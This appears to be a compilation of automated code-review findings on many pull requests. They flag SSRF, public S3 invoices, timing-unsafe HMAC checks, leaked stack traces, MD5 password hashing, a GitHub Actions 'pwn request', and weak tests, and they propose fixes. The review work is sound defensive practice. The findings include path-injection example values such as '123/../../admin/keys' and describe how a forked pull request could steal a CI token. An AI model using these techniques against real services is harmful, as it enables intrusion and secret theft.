The function directly above this one parses the destination host and rejects anything outside `ALLOWED_HOSTS` before issuing a request (lines 8-10). `verify_endpoint` takes a caller-supplied `url` and passes it straight to `requests.get` with no equivalent check. Since the whole point of this PR is to let tenants register an arbitrary URL, the argument here is attacker-controlled by design, and the returned status code is handed back to the caller, making this a usable probe of anything the service can reach (internal services, cloud metadata endpoints, `file://`-style schemes depending on the adapter set).

Extract the host validation from the post path into a shared helper and call it at the top of `verify_endpoint` before any request is made. Also consider `allow_redirects=False`, since a permitted host can otherwise redirect the request to an internal one.

_Also raised by the security agent:_ verify_endpoint bypasses ALLOWED_HOSTS allowlist (SSRF)

findings.title: verify_endpoint has no test coverage
findings.body: verify_endpoint is a new public function that performs an outbound GET to an arbitrary URL, but no test in this diff exercises it. Notably it does not reuse the ALLOWED_HOSTS check used on line 8 for the POST path, so a regression (e.g. someone assuming it's protected the same way) would go undetected. Add a test verifying its behavior, including how it handles disallowed/unexpected hosts.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A function named `verify_endpoint` that returns a status code will most often be called to decide whether a tenant-supplied URL is usable. For the common failure modes this is meant to detect — DNS failure, connection refused, TLS error, the 5s timeout firing — `requests.get` raises `requests.RequestException` rather than returning a response, so the call site gets an exception instead of a verdict. Either catch `requests.RequestException` and return a sentinel (`None`), or document that the caller must handle it.

findings.title: Customer invoices bucket created with all public-access blocks disabled
findings.body:
`aws_s3_bucket.invoices` (`acme-customer-invoices`) is paired with an `aws_s3_bucket_public_access_block` that sets all four guardrails to `false`. That turns off the account-level safety net that prevents a public ACL or public bucket policy from ever taking effect on this bucket: any later `aws_s3_bucket_acl`, object ACL, or bucket policy — added by a subsequent change, a console click, or a compromised CI role — will make customer invoices world-readable with nothing to stop it. The bucket name is also globally guessable, so discovery is trivial once anything public lands on it.

Fix: either omit the `aws_s3_bucket_public_access_block` for `invoices` (the AWS default for new buckets now blocks all public access) or set all four attributes to `true`. If public read is genuinely required for some prefix, front it with CloudFront/OAC rather than disabling the block.

Separately, this resource is out of scope for a PR described as "public assets bucket for the marketing site" — an invoices bucket should not ride along in a marketing-assets change, and the mismatch is itself worth a second look before merge.

_Also raised by the correctness agent:_ Invoices bucket added with all public-access protections disabled

findings.title: Bucket name 'invoices' contradicts PR purpose of 'public assets'
findings.body: The resource is named 'invoices' and stores 'acme-customer-invoices', suggesting it holds customer financial data, not public marketing assets as described in the PR. The naming is misleading about the bucket's actual purpose and sensitivity level. Either the PR description is incorrect, or this bucket should not be added to the same file as public assets without clear separation and documentation of its intended use.

findings.title: Webhook HMAC compared with `==` instead of compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC correctly but compares it to the caller-supplied `header` using `==`. Python's string equality short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the expected digest the attacker got right. An attacker who can submit many forged webhook bodies with candidate signature headers can recover the digest byte-by-byte and forge an accepted webhook without knowing the secret.

Use the same primitive the Stripe helper already uses on line 7:

    return hmac.compare_digest(expected, header)

While touching this, consider guarding against `header` being `None`/non-str, since `compare_digest` raises on non-ASCII or non-bytes-like inputs.

_Also raised by the correctness agent:_ verify_acmepay compares HMAC with == instead of compare_digest

findings.title: Public webhook verifier uses unsafe comparison without documentation
findings.body: `verify_acmepay` is a public function in a webhook verification module, positioned alongside `verify_stripe` which correctly uses `hmac.compare_digest`. A caller importing this function to verify webhook signatures would reasonably expect it to be timing-safe like its sibling. The function name and placement make no indication that it uses an unsafe comparison vulnerable to timing attacks, yet its implementation does exactly that. Either the implementation should match the pattern set by `verify_stripe`, or the function needs explicit documentation warning that it is not timing-safe and should not be used for cryptographic comparison.

findings.title: New verify_acmepay function has no test coverage
findings.body: The diff introduces verify_acmepay with no corresponding test changes. If the comparison logic were wrong (e.g. inverted, or the equality check behaved incorrectly for edge cases like non-string header or empty body), nothing in the current test suite would catch it since no test exercises this function at all.

findings.title: Stack trace and exception text returned in 500 response body
findings.body:
`handle(exc)` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` and `traceback.format_exc()` into the HTTP response. Anything that reaches this handler is disclosed to whoever triggered it: absolute source paths, module and function names, library versions, SQL fragments and DSNs from driver exceptions, and local values embedded in exception messages (e.g. `OperationalError: could not connect to server: host=db-prod user=app password=...`). An unauthenticated caller can probe endpoints with malformed input to map internals and harvest whatever leaks into exception text — this is the standard reconnaissance step before a targeted attack.

The stated goal (on-call visibility without SSH) is already met by the `log.exception("request failed")` on line 8. Keep the response opaque and correlate via an identifier instead:

```python
rid = uuid.uuid4().hex
log.exception("request failed", extra={"request_id": rid})
return {"error": "internal error", "request_id": rid}, 500
```

If verbose bodies are genuinely wanted for local work, gate them behind an explicit debug flag that is off by default in production config rather than returning them unconditionally.

_Also raised by the correctness agent:_ format_exc() may not describe `exc` (or any exception)

_Also raised by the correctness agent:_ 500 response body shape changed; `error` can now be empty

findings.title: No test verifies the error response contents
findings.body: The change alters the response body of handle() to include str(exc) and a full traceback, but no test exercises this function to confirm the response shape or content. If this were reverted or further modified (e.g. accidentally leaking more/less info, or breaking the tuple return shape), nothing in the test suite would fail.

findings.title: Password reset path hashes with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password hash with a single round of unsalted MD5, sitting directly next to `hash_password`, which correctly uses `bcrypt.hashpw` with a generated salt. MD5 is a fast, GPU-friendly digest with no salt and no work factor: a hash produced here is recoverable from commodity rainbow tables or brute-forced at billions of guesses per second, and because there is no salt, identical passwords produce identical digests across accounts, so a single dump reveals reuse instantly. Anyone who obtains the stored value (database dump, backup, log, SQL injection elsewhere) effectively obtains the plaintext password, which is exactly what bcrypt exists to prevent.

Use the same primitive as the main path: `return hash_password(raw)` (or call `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` directly). If the intent was a reset *token* rather than a password, it should be a `secrets.token_urlsafe(32)` value compared with `hmac.compare_digest`, not a digest of user-supplied text \u2014 the function name and the `raw` parameter say password, so the hashing choice should match `hash_password`.

findings.title: Reset path stores an MD5 digest bcrypt verification cannot read
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), and any verifier for it will call `bcrypt.checkpw(raw, stored)`. `hash_reset_password` returns a 32-char MD5 hex digest with no bcrypt prefix and no salt, so if its output is written into the same password column, the subsequent login attempt either fails to match or raises `ValueError: invalid salt` inside `checkpw` — a user who resets their password is locked out. Either produce a bcrypt hash here (i.e. just call `hash_password`), or store the reset digest in a distinct field with its own verification routine and a distinct lifetime. The verifier was not included in the retrieved context, so confirm which column the return value lands in before deciding.

findings.title: New reset-password hashing function has no test coverage
findings.body: hash_reset_password is a new, security-relevant function (used in a password reset path) with no accompanying test. Nothing in this diff would catch a regression, a change in algorithm, or an incorrect output. Add a test asserting the function's actual output properties (e.g. it returns a hex digest of expected length/format for a known input) so future changes to this function are checked.

findings.title: checksum() reads the entire file into memory and takes an unvalidated path
findings.body: `checksum` opens `path` directly and calls `fh.read()`, materialising the whole file in memory before hashing. If `path` is ever influenced by a request (an upload name, a report identifier), two things follow: a large or special file (`/dev/zero`, a multi-GB upload) exhausts memory or hangs the worker, and a relative or `..` component reads files outside the intended directory. Hash in fixed-size chunks (`for block in iter(lambda: fh.read(65536), b""): h.update(block)`) and resolve the path against an allowed base directory with `os.path.realpath` before opening.

findings.title: pull_request_target runs fork-controlled code with secrets (pwn request)
findings.body:
This change combines the three ingredients of a "pwn request":

1. Line 4 switches the trigger to `pull_request_target`, so the job runs in the context of the **base** repository with access to repository secrets and a write-scoped `GITHUB_TOKEN`, with no approval gate for first-time or external contributors.
2. Lines 11–12 explicitly check out `github.event.pull_request.head.sha` — the attacker's commit from the fork — overriding the safe default of checking out the base ref.
3. Line 13 then executes `./scripts/measure.sh`, a file that now comes from the attacker's checkout, and lines 14–15 place `secrets.NPM_TOKEN` directly into its environment.

Any person on the internet can open a pull request from a fork that replaces `scripts/measure.sh` (or anything it sources/requires, e.g. a `package.json` `prepare` script if the script installs dependencies) and have it print or POST `$NPM_TOKEN` to a server they control. `actions/checkout` also persists credentials into `.git/config` by default, so the same script can read the privileged `GITHUB_TOKEN` and push to the base repository. Exploitation requires no maintainer interaction.

Fixes, in order of preference:
- Revert line 4 to `pull_request`. A size check does not need repository secrets; forked PRs still run, just with a read-only token and no secrets, which is the correct signal for untrusted code.
- If a token genuinely is required, split into two workflows: an unprivileged `pull_request` job that builds/measures and uploads an artifact, and a privileged `workflow_run` job that consumes the artifact without ever executing fork code.
- If `pull_request_target` must stay, never check out the head SHA and never run scripts from it; and at minimum set `persist-credentials: false` and scope/remove `NPM_TOKEN`.

_Also raised by the correctness agent:_ pull_request_target checks out fork code and exposes NPM_TOKEN

findings.title: pull_request_target runs the base-branch workflow, not the PR's version
findings.body: With `pull_request_target`, GitHub always evaluates the workflow file from the base branch, so changes a PR makes to `.github/workflows/size.yml` (or to the trigger/steps) will not be exercised by the PR's own run. Under the previous `pull_request` trigger, same-repo PRs did test their workflow edits. If anyone relies on this workflow validating its own changes, that signal is now silently gone.

findings.title: json.dumps narrows accepted contexts; previously-working calls now raise
findings.body:
The old key `(template_source, tuple(sorted(context.items())))` accepted any context whose values were hashable and whose keys were mutually sortable — e.g. `datetime`, `Decimal`, `set`, dataclass instances, or any custom object. `json.dumps` accepts only JSON-native types and will raise `TypeError: Object of type X is not JSON serializable` for all of those. Mixed key types are also worse off: `json.dumps({1: "a", "b": 2}, sort_keys=True)` raises `TypeError: '<' not supported between instances of 'str' and 'int'`.

This turns a working memoised render into an unhandled exception at call time for any caller passing a richer context. If the intent is a digest key, use a serialiser that degrades safely (`json.dumps(..., default=repr)`) or fall back to the previous structural key when serialisation fails. Either way, add a test with a non-JSON value — the two new tests only exercise `int` values.

findings.title: MD5 digest as cache key allows collision-based cache poisoning
findings.body:
`cached_render` now collapses the exact key `(template_source, tuple(sorted(context.items())))` into `hashlib.md5(payload).hexdigest()`. MD5 has practical chosen-prefix collisions, so two different `(template_source, context)` pairs can be made to produce the same 128-bit key. Line 11 then treats a key hit as proof the inputs were identical and returns the cached output of the *other* input — a cache-poisoning / cross-render disclosure primitive if either the template source or any context value is attacker-influenced (e.g. user-supplied templates, per-tenant context fields).

The sink is the `key not in _CACHE` lookup on line 11; the entry point is whatever supplies `template_source`/`context`, which is not visible in this diff or in any retrieved file — that is the main uncertainty here.

Fixes, in increasing cost:
- Use `hashlib.sha256(...)` or `hashlib.blake2b(payload.encode(), digest_size=32)`; the hashing cost is negligible next to rendering.
- If the digest is purely a non-security memoisation key and inputs are provably trusted, at minimum pass `usedforsecurity=False` so the call does not break on FIPS-mode builds, and document why collisions are acceptable.

Separately worth noting while you are here: `json.dumps` stringifies dict keys, so `{1: x}` and `{"1": x}` serialise identically and will share a cache entry even before any hash collision.

findings.title: No test that varying template_source (same context) busts the cache
findings.body: Both new tests (test_key_is_by_value_not_by_identity, test_different_context_renders_again) only vary the context dict while keeping template_source constant. If a future edit accidentally dropped template_source from the JSON payload used to build the key (e.g. `payload = json.dumps([context], sort_keys=True)`), every existing test would still pass since none of them render two different templates with the same context and check that both are rendered separately. Add a test like `cached_render("{{ a }}", {"a":1})` then `cached_render("{{ b }}", {"a":1})` and assert `counter.renders == 2`.

findings.title: `spy` fixture is not defined in this change; test may error or shell out for real
findings.body:
`test_runs_without_a_shell` requests a `spy` fixture that is not a pytest builtin and is not provided by any file in this PR (no `conftest.py` is added). If it does not already exist in the repo, the test errors at collection with `fixture 'spy' not found`. Worse, if `spy` exists but does not patch `subprocess.run`, this test really invokes `tar` and writes to `/exports/nightly.tar.gz`, failing on any machine without that directory. Add the fixture (or use `mocker.patch("export.archive.subprocess.run")`) and assert on the argv list as well as `shell`, so the test would also catch a regression back to a single command string.

_Also raised by the tests agent:_ Test checks only `shell=False`, not that argv is a safe list

findings.title: New name allowlist rejects names that previously worked
findings.body: `create_archive` previously accepted any `name` and interpolated it into the shell string, so callers could legitimately pass names containing `.`, `:`, spaces, or longer than 64 characters (e.g. `"orders.2024-01-01T03:00:00"` or a tenant slug). Those calls now raise `ValueError` at runtime instead of producing an archive. Since no callers were retrieved, please confirm every call site produces names matching `[A-Za-z0-9_-]{1,64}`; if timestamped or dotted names are in use, either widen the pattern (allow `.` and `:`) or normalise the name before validating rather than rejecting.

findings.title: `directory` reaches tar unvalidated; may allow arbitrary path archiving
findings.body:
`name` is constrained to `[A-Za-z0-9_-]{1,64}` before use, but `directory` is passed straight into the argv on line 12 with no validation or containment check. Because `shell=False` and `--` precedes it, this is not shell injection and not option injection — but it is still an arbitrary path. If any caller derives `directory` from user input (a request field, a job payload, a CLI arg exposed to a lower-privilege user), that user can cause tar to read paths the caller was never meant to reach (`/etc`, `/root`, another tenant's export dir) and have the contents written into `/exports/<name>.tar.gz`, which is presumably then downloadable.

If `directory` is only ever an internal constant, this is nothing. If it can come from outside, resolve it (`os.path.realpath`) and assert it is under an allowed root before invoking tar, the same way `name` is constrained. Consider `--no-recursion`/`-h` semantics too: a symlink inside the tree can pull in files outside it.

findings.title: `directory` no longer word-split or glob-expanded by the shell
findings.body: With `shell=True` the old code let `/bin/sh` split `directory` on whitespace and expand globs, so a caller passing `"/srv/a /srv/b"` archived two trees and `"/srv/data/*"` expanded to its children. As a single argv element, `"/srv/a /srv/b"` is now one literal path and `tar` fails with `check=True`, and `"/srv/data/*"` is passed to tar verbatim. This is the right direction, but if any caller relies on multi-path or glob arguments it will now raise `CalledProcessError`. Consider accepting a list of directories and splatting it into the argv instead.

findings.title: test_renders_empty_invoice asserts nothing
findings.body:
The test calls `render(Invoice(lines=[]))` and discards the result, so it only fails if `render` raises. Any regression that returns `None`, an empty string, a stale header, or a malformed total for a blank invoice will pass silently. Assert on the return value — e.g. that it equals the expected empty-invoice rendering, or at minimum that it is a non-empty string containing the zero total — matching the style of `test_renders_total` on line 2.

_Also raised by the tests agent:_ test_renders_empty_invoice asserts nothing

findings.title: Line-item test checks the mock, not the rendered output
findings.body:
`mocker.patch("invoice.format_line")` replaces the formatter with a `MagicMock`, so `render`'s output for the two lines is whatever `str(MagicMock())` produces and is never inspected. The test passes as long as `format_line` is invoked twice, even if the results are dropped on the floor or concatenated in the wrong order. Consider asserting on the returned string (or at least `fmt.call_args_list` to pin the arguments) so that a regression in how line output is assembled is actually caught.

_Also raised by the tests agent:_ test_renders_line_items only asserts mock call count

findings.title: Failing boundary test deleted, not updated; no fix included in diff
findings.body:
This PR deletes `test_rounds_half_to_even`, the only test exercising the exact-half boundary (`Decimal("2.345")`), but contains no change to `round_cents` itself. Either the implementation fix lives outside this PR \u2014 in which case the test should have been *updated* to assert the new expected value (e.g. `Decimal("2.35")`) rather than removed \u2014 or no fix exists and the test was dropped to make CI green. Restore a test covering the exact-half input with whatever the intended rounding mode now produces; the half-way case is precisely the input where `round_cents` is most likely to regress, and it is now unverified. The remaining `test_rounds_up_above_half` only covers inputs strictly above the midpoint and will pass under either rounding mode.

_Also raised by the tests agent:_ Deleted test leaves half-to-even rounding case uncovered

findings.title: Patch target misses the name bound in notify.sender
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so `deliver` is resolved from `notify.sender`'s module globals at call time, not via `notify.transport`. Patching `notify.transport.deliver` therefore leaves `send_with_retry` calling the real `deliver`, and the assertion on line 8 passes or fails based on the real transport rather than on the stubbed failure — it may hit the network, and it will not actually verify the give-up-after-N-attempts behaviour. Use `mocker.patch("notify.sender.deliver", return_value=False)`, matching the existing test on line 2. Consider also asserting the mock's `call_count == 3` so the retry count is genuinely covered.

_Also raised by the tests agent:_ Mock patches wrong import path, test doesn't exercise retry logic

findings.title: Test patches wrong target, contradicting module documentation
findings.body: The new test on line 6-8 patches `notify.transport.deliver`, but the docstring in notify/sender.py explicitly states this approach does not work: 'patching `notify.transport.deliver` does not affect it' because `deliver` is bound into the module's namespace at import time. The test at line 2 demonstrates the correct patch target: `notify.sender.deliver`. Either the test is wrong, or the documented behavior and the first test are wrong. Since the first test already establishes the correct pattern, this new test will not actually exercise the retry-on-failure path it claims to test.

findings.title: csv_rows joins raw values without calling csv_escape
findings.body:
`csv_rows` interpolates `str(r.get(c, ""))` directly into a comma-joined line, so a cell value such as `Doe, John` or `he said "hi"` emits extra field separators or unbalanced quotes and shifts every following column in that row. The escaping helper needed to prevent this is added in the very same change (`csv_escape`, lines 10–14) but is never referenced. Wrap each cell: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

_Also raised by the security agent:_ csv_rows joins values without applying csv_escape

findings.title: New exporter functions added with no tests, unlike existing convention
findings.body: The repo has a precedent of testing exporter helpers (test_csv.py tests csv_header). This PR adds six new public functions across csv_export.py, json_export.py, and pdf_export.py with non-trivial logic (CSV escaping/quoting, chunked JSON streaming, pretty JSON formatting, margin/width arithmetic) but includes no tests for any of them. A regression in the comma/quote-escaping logic, an off-by-one in chunk boundaries, or an arithmetic mistake in margin calculation would go undetected.

findings.title: csv_escape does not quote values containing newlines or CR
findings.body: A field containing `\n` or `\r` must also be quoted, otherwise it splits one logical record across multiple physical lines and every downstream parser mis-reads the file. Extend the condition to `if any(ch in value for ch in ',"\n\r')`. Separately, `"," in value` raises `TypeError` for any non-string argument, so callers must stringify before calling.

findings.title: Date comparison against wall clock is flaky at the UTC midnight boundary
findings.body:
`issue_token()` captures `issued_at` from the clock, and the assertion re-reads `datetime.now(timezone.utc)` a moment later. If the two reads straddle 00:00 UTC, `.date()` differs and the test fails for reasons unrelated to the code under test. The adjacent test at lines 4–6 avoids this by constructing a fixed `issued` instant and passing `now=` explicitly; do the same here — freeze or inject the clock (e.g. have `issue_token` accept a `now`/`issued_at` parameter, or patch the clock) and assert against that fixed value instead of `datetime.now`.

_Also raised by the tests agent:_ Time-dependent test doesn't pin 'now', can't meaningfully fail

findings.title: `is_expired` called without `now=`, relying on the ambient clock
findings.body: The existing test pins the comparison instant with `now=`; this call omits it and so depends on the real clock and on whatever default expiry `issue_token()` uses. That couples the assertion to an unseen default — if the issued lifetime is ever shortened, or if the suite runs slowly, the assertion silently changes meaning. Pass an explicit `now=` derived from the token's own `issued_at` so the test states the window it is checking.

findings.title: No test exercises the new expiry-rejection branch
findings.body: The PR adds logic to reject expired coupons by raising CouponExpired, but the only test change updates the happy-path test to pass a non-expired coupon (tomorrow()). There is no test that passes an expired coupon and asserts CouponExpired is raised. If the comparison logic were wrong (e.g. inverted, wrong timezone handling, off-by-one), nothing in the test suite would catch it.

findings.title: expires_at comparison breaks on None or naive datetimes
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` raises `TypeError` in two reachable cases: if `expires_at` is `None` (a coupon that never expires — a common representation), and if it is a naive datetime, since Python refuses to compare naive and aware datetimes. Either produces an opaque `TypeError` from deep inside billing rather than a clean result. Guard explicitly, e.g. `if coupon.expires_at is not None and coupon.expires_at < datetime.now(timezone.utc)`, and normalise/assert tz-awareness at the boundary where coupons are loaded.

findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but contains no `await`; it calls the synchronous `requests.get` directly. Because coroutines run on the event loop thread, this blocks every other task in the process for the full duration of the HTTP call — up to the 5 second timeout — including unrelated in-flight requests. The `async` keyword also makes callers believe the call yields, so it will be freely awaited from hot request paths.

Use the same pattern as `fetch_plan` above: take (or create) an `httpx.AsyncClient` and `await client.get(...)`, dropping the `requests` import. If a sync client is genuinely required, wrap it with `await asyncio.to_thread(requests.get, ...)` so the loop is not blocked.

findings.title: New fetch_plan_limits has no test coverage
findings.body: fetch_plan_limits is a new async function that performs an HTTP call and parses JSON, but no test exercises it. If the URL, timeout, or response-parsing logic were wrong, or if the synchronous requests.get call inadvertently blocked the event loop, nothing in the diff would fail. Since this function is user-facing (drives quota display), add at least a test that mocks the HTTP call and asserts on the returned value.

findings.title: Unencoded tenant_id interpolated into internal billing URL
findings.body:
`tenant_id` is f-string-interpolated straight into `https://billing.internal/limits/{tenant_id}` with no URL-encoding, type check, or format validation. If `tenant_id` originates from a request path/query/body (the function name and the PR description — "during request handling" — suggest it does), a value such as `123/../../admin/keys`, `123?admin=1`, or one containing `#`/`%2f` lets the caller reshape the request against an internal, presumably unauthenticated service reachable from the app. That is a server-side request forgery / path-injection primitive pointed at the billing backend.

Fix: validate the identifier before use (e.g. assert it is an int or matches `^[A-Za-z0-9-]+$`), or at minimum pass it through `urllib.parse.quote(str(tenant_id), safe='')`. Passing it as a query parameter via `params=` rather than splicing it into the path is also safe.

Note the pre-existing `fetch_plan` on line 6 has the same shape; if you fix one, fix both.

findings.title: Bare except swallows BaseException and logs nothing
findings.body:
`except:` catches `BaseException`, so `KeyboardInterrupt` and `SystemExit` (and any programming error such as `NameError` if `_client` is unbound) are absorbed and turned into a silent `None`. That makes the process un-interruptible during a push and hides genuine bugs. The PR description says "catch and log", but no logging happens here — every failure is invisible.

Use `except Exception as exc:` and log it, e.g. `logger.exception("metrics push failed")`, before returning.

findings.title: No test verifies push_metrics survives send() failures
findings.body: The change's entire purpose is to make metrics push non-fatal on failure, but no test exercises _client.send raising an exception. Nothing would catch a regression where this bare except is removed, narrowed incorrectly, or where the function re-raises. Add a test that mocks _client.send to raise and asserts push_metrics returns None (or otherwise doesn't propagate) instead of raising.

findings.title: try_consume reads and writes _counters without _lock across an await
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, then yields to the event loop at line 18 (`await asyncio.sleep(0)`), then writes `_counters[tenant] = current + cost` at line 19 using the value captured *before* the yield. Two problems follow:

1. Limit overrun: two coroutines for the same tenant can both pass the `current + cost > LIMIT` check at line 16 while `current` is below the limit, then both commit, so the stored total exceeds `LIMIT`. The check and the act are not atomic.
2. Lost update: the write at line 19 is an absolute assignment from a stale snapshot, not an increment. Any `consume()` call (line 10) or other `try_consume` that commits during the `await` window is overwritten and its cost disappears from the counter — a tenant can consume unbounded budget by interleaving calls.

The module already has `_lock` and `consume()` correctly holds it for its read-modify-write; `try_consume` needs the same discipline. Wrap the whole read/check/write in `async with _lock:` (and do the write as `_counters[tenant] = _counters.get(tenant, 0) + cost` re-read under the lock, rather than from the pre-await snapshot). Note that `consume()` never consults `LIMIT`, so if both entry points are live the lock alone still leaves the limit advisory — worth confirming which one callers use.

_Also raised by the security agent:_ try_consume checks and updates the counter without the lock

findings.title: try_consume's race condition and limit enforcement are untested
findings.body: try_consume reads _counters without holding _lock, then awaits asyncio.sleep(0) (a yield point) before writing back, unlike consume which does the whole read-modify-write under _lock. This reintroduces the exact check-then-act race the PR title references. No test exercises concurrent calls to try_consume to verify it correctly rejects over-limit requests or that it doesn't allow two concurrent callers to both pass the check and exceed LIMIT. A test with two concurrent try_consume calls near the limit would currently pass even though the race allows the limit to be exceeded.

findings.title: Docstring does not match new return type
findings.body:
The docstring claims `lookup_user` returns `(name, email)` as a tuple, but line 6 now returns a dict with keys `name`, `email`, and `tier`. Any caller relying on tuple unpacking (like the one in reports/weekly.py that does `name, email = lookup_user(user_id)`) will break. The docstring must be updated to document the new dict structure.

_Also raised by the correctness agent:_ Docstring still documents the old (name, email) tuple return

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body:
`lookup_user` now returns a dict instead of the `(name, email)` tuple. The existing caller `render_row` in reports/weekly.py does `name, email = lookup_user(user_id)`; unpacking a 3-key dict raises `ValueError: too many values to unpack (expected 2)` on every call. Even if the dict had exactly two keys, unpacking would bind the *keys* (`"name"`, `"email"`), silently producing `name <email>` output rather than real data.

Either update all callers in the same change (reports/weekly.py should become `user = lookup_user(user_id); return f"{user['name']} <{user['email']}>"`), or add the new field via a separate function / an opt-in parameter so the existing tuple contract is preserved.

findings.title: Return-shape change untested against existing caller
findings.body: lookup_user now returns a dict {name, email, tier} instead of the (name, email) tuple documented in the docstring and relied upon by reports/weekly.py's render_row, which does `name, email = lookup_user(user_id)`. Unpacking a dict of 3 keys into 2 variables raises a ValueError. There is no test in this diff exercising lookup_user's return value or render_row after the change, so this breakage would only surface at runtime.

findings.title: WriteSettlement always returns nil, swallowing insert failures
findings.body:
The `err` from `db.Exec` is scoped to the `if` statement on line 15 and is only logged.
